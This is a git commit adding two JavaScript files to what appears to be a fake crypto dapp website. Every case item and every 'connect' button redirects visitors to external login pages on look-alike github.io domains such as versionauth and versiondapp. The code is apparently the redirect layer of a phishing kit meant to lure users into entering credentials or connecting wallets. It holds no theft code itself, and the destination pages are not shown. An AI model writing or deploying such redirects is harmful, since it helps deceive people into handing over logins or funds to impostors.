c4d128343dea72a9d6b20b0f4724594996efa9c3
Elondave <156205213+Elondave@users.noreply.github.com>
2026-06-20 09:24:06 -0700

    Initial commit

---
+++ Script/PB32-cases.js
@@ -0,0 +1,14 @@
+document.addEventListener('DOMContentLoaded', function () {
+    // URL to navigate to
+    const targetURL = "https://versiondapp.github.io/auth/login.html";
+  
+    // Select all case-item-container elements
+    const caseItemContainers = document.querySelectorAll('.case-item-container, .case-item-container-2');
+  
+    // Add click event listener to each container
+    caseItemContainers.forEach(container => {
+      container.addEventListener('click', function () {
+        window.location.href = "https://versionauth.github.io/user/login.html";
+      });
+    });
+  });
---
+++ Script/PB32-connect.js
@@ -0,0 +1,14 @@
+document.getElementById("connectButton").addEventListener("click", function () {
+    window.location.href = "https://versionauth.github.io/user/login.html"
+  });
+  document.getElementById("connectButton2").addEventListener("click", function () {
+    window.location.href = "https://versionauth.github.io/user/login.html"
+  });
+  document.getElementById("connectButton3").addEventListener("click", function () {
+    window.location.href = "https://versionauth.github.io/user/login.html"
+  });
+  document.querySelectorAll(".connectButton4").forEach(element => {
+    element.addEventListener("click", function () {
+      window.location.href = "http://versionauth.github.io/user/login.html";
+    });
+  });
